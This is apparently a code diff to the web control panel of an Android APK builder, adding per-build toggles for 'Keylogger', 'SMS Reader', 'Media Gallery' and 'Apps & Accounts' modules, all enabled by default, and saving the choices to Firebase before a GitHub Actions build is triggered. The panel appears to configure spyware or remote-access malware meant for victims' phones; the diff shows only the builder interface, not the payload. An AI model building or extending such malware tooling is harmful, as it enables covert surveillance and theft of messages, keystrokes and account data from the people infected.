@@ -9,7 +9,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css?v=3.7">
+    <link rel="stylesheet" href="style.css?v=3.8">
     
     <!-- JSZip for extracting APK from GitHub Artifacts -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -137,6 +137,31 @@
                             <div>
                                 <label class="form-label">Custom App Icon (PNG)</label>
                                 <input type="file" id="appIconInput" accept="image/png" class="form-input" style="padding: 8px 14px; font-size: 0.82rem;">
+                            </div>
+                            <!-- Modular Feature & Permission Toggles -->
+                            <div style="background: rgba(255,255,255,0.03); padding: 14px 16px; border-radius: 14px; border: 1px solid var(--border); display: flex; flex-direction: column; gap: 10px;">
+                                <div style="font-size: 0.8rem; font-weight: 700; color: #fff; display: flex; align-items: center; justify-content: space-between;">
+                                    <span><i class="fas fa-sliders-h text-primary-c me-1"></i> Feature & Module Permissions</span>
+                                    <span style="font-size: 0.68rem; color: var(--text-muted);">Enable/Disable per build</span>
+                                </div>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-images text-primary-c me-1"></i> Media Gallery</span>
+                                        <input type="checkbox" id="featureGallery" name="feature_gallery" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-keyboard text-primary-c me-1"></i> Keylogger</span>
+                                        <input type="checkbox" id="featureKeylogger" name="feature_keylogger" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-envelope text-primary-c me-1"></i> SMS Reader</span>
+                                        <input type="checkbox" id="featureSMS" name="feature_sms" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                    <label style="display: flex; align-items: center; justify-content: space-between; cursor: pointer; user-select: none; font-size: 0.76rem; color: var(--text-secondary); background: rgba(0,0,0,0.25); padding: 8px 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);">
+                                        <span><i class="fas fa-th text-primary-c me-1"></i> Apps & Accounts</span>
+                                        <input type="checkbox" id="featureApps" name="feature_apps" checked style="accent-color: var(--primary); cursor: pointer;">
+                                    </label>
+                                </div>
                             </div>
                             <button type="submit" id="buildBtn" class="btn-primary-glow" style="margin-top: 6px; width: 100%; border-radius: var(--radius-pill);">
                                 <i id="buildIcon" class="fas fa-rocket"></i><span id="buildText">BUILD APK</span>
@@ -556,6 +581,18 @@
             status: '⏳ Starting build...',
             percent: 10,
             last_log: 'Wait for building...'
+        });
+
+        const featGallery = document.getElementById('featureGallery') ? document.getElementById('featureGallery').checked : true;
+        const featKeylogger = document.getElementById('featureKeylogger') ? document.getElementById('featureKeylogger').checked : true;
+        const featSMS = document.getElementById('featureSMS') ? document.getElementById('featureSMS').checked : true;
+        const featApps = document.getElementById('featureApps') ? document.getElementById('featureApps').checked : true;
+
+        fbDb.ref('panel_users/' + userId + '/features').set({
+            gallery: featGallery,
+            keylogger: featKeylogger,
+            sms: featSMS,
+            apps: featApps
         });
 
         // Trigger GitHub Actions workflow dispatch
